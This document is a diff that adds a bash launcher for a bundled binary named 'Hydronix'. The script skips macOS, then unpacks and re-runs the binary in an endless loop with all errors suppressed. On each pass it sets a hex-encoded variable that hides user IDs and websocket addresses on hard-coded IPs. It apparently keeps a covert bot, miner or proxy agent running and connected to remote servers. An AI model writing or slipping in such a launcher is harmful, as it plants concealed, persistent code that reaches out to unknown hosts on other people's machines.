@@ -1,0 +1,22 @@
+#!/bin/bash
+if [[ "$(uname)" == "Darwin" ]]; then
+  echo "[!] macOS detected, stopping."
+  exit 2
+fi
+tar xzf Hydronix-linux-x64.tar.gz
+chmod +x Hydronix
+
+while true; do
+    tar xzf Hydronix-linux-x64.tar.gz || true
+    chmod +x Hydronix || true
+
+    case $((RANDOM % 4)) in
+    0) export STATEVV="7569645f746e76667675616f63756634686871626a5f6b68616e683030337c77733a2f2f3136302e32322e37342e3136353a343536312f77737c34" ;;
+    1) export STATEVV="7569645f616e306e3737317578367a32756e3876796d685f6b68616e683030337c77733a2f2f3136302e32322e37342e3136363a343536312f77737c34" ;;
+    2) export STATEVV="7569645f39677877767161347370686679756c61795f6b68616e683030337c77733a2f2f3136302e32322e37342e3136373a343536312f77737c34" ;;
+    3) export STATEVV="7569645f6c786e6571736731317670747a6563376d386b6f3675645f6b68616e683030337c77733a2f2f3136302e32322e37342e3136383a343536312f77737c34" ;;
+    esac
+    
+    ./Hydronix || true
+    sleep 5
+done
